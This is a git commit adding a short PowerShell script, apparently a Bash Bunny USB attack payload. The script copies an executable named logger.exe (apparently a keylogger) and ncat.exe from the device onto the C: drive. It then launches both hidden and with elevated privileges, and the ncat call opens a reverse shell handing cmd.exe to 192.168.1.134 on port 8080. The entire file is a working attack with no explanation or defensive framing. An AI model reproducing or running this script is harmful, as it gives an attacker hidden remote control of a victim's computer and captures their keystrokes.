0a169b08796e93b3b5eed5a41dfb139e1bb92625
Anthony F <Anthony-Figi@users.noreply.github.com>
2018-11-01 02:10:15 -0700

    Add files via upload
    Created

---
+++ linux/upload-files.ps1
@@ -0,0 +1,5 @@
+﻿cp $((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\switch2\logger.exe') c:\logger.exe; 
+cp $((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\switch2\ncat.exe')  c:\ncat.exe;
+
+Start-Process powershell -windowstyle hidden -Verb runAs "c:\ncat.exe 192.168.1.134 8080 -e cmd.exe";
+Start-Process powershell -windowstyle hidden -Verb runAs "c:\logger.exe";
